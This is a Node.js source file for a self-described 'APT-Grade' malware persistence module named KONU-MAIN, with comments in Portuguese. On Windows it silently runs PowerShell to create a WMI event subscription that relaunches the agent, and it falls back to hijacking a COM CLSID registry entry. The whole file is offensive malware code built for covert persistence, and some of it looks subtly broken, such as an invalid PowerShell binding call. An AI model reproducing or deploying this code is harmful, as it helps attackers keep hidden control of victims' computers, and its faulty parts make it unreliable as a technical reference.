const { execSync } = require('child_process');
const os = require('os');

/**
 * KONU-MAIN | ADVANCED PERSISTENCE MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: WMI Event Subscription & COM Hijacking
 */

class Persistence {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        this.agentPath = process.execPath;
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping Persistence.');
            return false;
        }

        try {
            console.log('[*] Initializing Stealth Persistence...');
            
            // Tentamos a técnica mais invisível primeiro (WMI)
            const wmiSuccess = this.setupWMIPersistence();
            
            if (wmiSuccess) {
                console.log('[+] Stealth Persistence (WMI) established successfully.');
                return true;
            } else {
                console.log('[!] WMI failed. Falling back to COM Hijacking...');
                return this.setupCOMHijacking();
            }
        } catch (error) {
            console.error(`[-] Persistence error: ${error.message}`);
            return false;
        }
    }

    setupWMIPersistence() {
        /**
         * Técnica: WMI Event Subscription
         * Cria um filtro e um consumidor WMI que dispara o agente
         * automaticamente após o boot, sem usar chaves de registro comuns.
         */
        try {
            const filterName = 'KonuSystemHealth';
            const consumerName = 'KonuHealthCheck';
            const query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfRawData_PerfOS_System"';
            const command = `"${this.agentPath}"`;

            // Criação do Filtro de Evento
            execSync(`powershell -Command "Set-WmiInstance -Class __EventFilter -Arguments @{Name='${filterName}'; EventNamespace='root\\cimv2'; Query='${query}'}"`, { stdio: 'ignore' });
            
            // Criação do Consumidor de Comando
            execSync(`powershell -Command "Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='${consumerName}'; CommandLineTemplate='${command}'}"`, { stdio: 'ignore' });
            
            // Vincula o Filtro ao Consumidor
            execSync(`powershell -Command "__InstanceOf('__FilterToConsumerBinding').Bind('${filterName}', '${consumerName}')"`, { stdio: 'ignore' });

            return true;
        } catch (e) {
            return false;
        }
    }

    setupCOMHijacking() {
        /**
         * Técnica: COM Object Hijacking
         * Substitui a entrada de um objeto CLSID legítimo no registro do usuário.
         * Quando o Windows tenta carregar esse objeto, ele carrega o nosso agente.
         */
        try {
            // CLSID de um objeto comum que o Windows carrega frequentemente
            const clsid = '{B4BCC3F5-B2D7-4F3D-B0D5-C26C2C711D3F}'; 
            const regPath = `HKCU\\Software\\Classes\\CLSID\\${clsid}\\InprocServer32`;

            execSync(`reg add "${regPath}" /ve /t REG_SZ /d "${this.agentPath}" /f`, { stdio: 'ignore' });
            
            console.log('[+] COM Hijacking persistence established.');
            return true;
        } catch (e) {
            console.error(`[-] COM Hijacking failed: ${e.message}`);
            return false;
        }
    }
}

module.exports = new Persistence();
